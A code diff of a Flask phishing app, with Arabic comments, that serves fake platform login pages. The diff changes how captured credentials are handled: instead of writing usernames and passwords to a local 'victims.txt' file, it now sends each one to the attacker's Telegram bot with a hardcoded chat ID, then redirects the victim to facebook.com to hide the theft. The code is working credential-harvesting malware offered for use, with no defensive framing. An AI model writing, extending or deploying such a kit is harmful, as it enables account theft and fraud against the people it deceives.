@@ -1,8 +1,13 @@
 from flask import Flask, render_template_string, request, redirect
+import requests
 
 app = Flask(__name__)
 
-# --- الواجهة الرئيسية الاحترافية مع الـ Slider ---
+# --- إعدادات التيليجرام (عمرهم بمعلوماتك) ---
+TOKEN = "حط_هنا_التوكن_اللي_عطاهولك_BotFather"
+CHAT_ID = "7479786207"
+
+# --- الواجهة الاحترافية (HTML) ---
 hacker_ui = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -99,9 +104,18 @@ def login(platform):
 
 @app.route('/catch', methods=['POST'])
 def catch():
-    user = request.form.get('user'); pwd = request.form.get('pass'); platform = request.args.get('platform')
-    with open("victims.txt", "a") as f: f.write(f"[{platform.upper()}] {user} : {pwd}\\n")
-    return redirect('/')
+    user = request.form.get('user')
+    pwd = request.form.get('pass')
+    platform = request.args.get('platform')
+    
+    # رسالة التبليغ اللي توصلك للتيليجرام
+    msg = f"🔥 صيد جديد يا فارس! 🔥\\n\\n👤 المنصة: {platform.upper()}\\n📧 الحساب: {user}\\n🔑 المودباس: {pwd}"
+    
+    # إرسال البيانات للتيليجرام
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}"
+    requests.get(url)
+    
+    return redirect('https://facebook.com')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
